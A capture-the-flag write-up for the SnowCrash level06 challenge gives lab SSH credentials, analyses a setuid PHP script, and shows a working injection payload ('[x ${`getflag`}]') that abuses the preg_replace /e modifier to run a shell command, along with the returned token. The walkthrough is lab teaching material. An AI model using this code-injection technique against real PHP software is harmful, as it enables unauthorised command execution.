# Level06

## How to login

```
ssh level06@192.168.1.184 -p 4242
password: viuaaale9huek52boumoomioc
```

## How to get the flag

Once logged, we find the following two files. 'level06.php' seems to be a PHP script and 'level06' the binary of this same script. The binary has the Setuid bit set, meaning that it will be executed with the privileges of the file owner, this can be a security risk if the file is vulnerable to exploitation since an attacker could potentially exploit the file to gain the privileges of the file owner (flag06).
```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

After passing the content of 'level06.php' through a [PHP Beautifier](https://codebeautify.org/php-beautifier), we obtain the following code which seems to be designed to process a file and perform specific string replacements using regular expressions.
```
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

A deeper evaluation of the script shows that it reads a file (passed as the first argument), processes its content by replacing . with x and @ with y inside [x ...] blocks, converts [ and ] to ( and ), and outputs the modified content. Nothing is done with the second arguments (argv[2]).

A security concern arise, since the use of the /e modifier in 'preg_replace' is dangerous because it evaluates the replacement string as PHP code. This can lead to code injection vulnerabilities if the input is not properly sanitized. This feature has been deprecated as of PHP 5.5.0 and removed in PHP 7.0.0.

Knowing that, we will try to introduce the command 'getflag' in such way that is recognized as the pattern under evaluation and hopefully executed. To do that we need to craft the exploit as shown below and then execute the binary 'level06' with the created exploit. The backticks (`) in PHP execute shell commands.
```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

And the flag is obtained.